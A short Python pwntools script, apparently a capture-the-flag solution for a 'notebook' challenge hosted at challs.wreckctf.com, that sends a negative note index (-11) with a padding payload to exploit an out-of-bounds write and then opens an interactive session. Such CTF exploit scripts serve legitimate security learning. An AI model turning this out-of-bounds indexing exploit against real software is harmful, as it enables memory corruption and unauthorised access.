from pwn import *
import sys


binary = "./notebook"
context.terminal = ["konsole", "-e"]


if "remote" in sys.argv:
    sh = remote("challs.wreckctf.com", 31857)
else:
    sh = process(binary)
    if "gdb" in sys.argv:
        gdb.attach(sh, gdbscript="""
            break *write_note+164
            continue
        """)


def write_note(index, msg):
    sh.recvuntil(b">")
    sh.sendline(b"1")
    sh.recvuntil(b":")
    sh.send(index)
    sh.recvuntil(b":")
    sh.send(msg)


payload = b"A"*(8 * 3)
payload += b"A"

write_note(b"-11", payload)

sh.interactive()
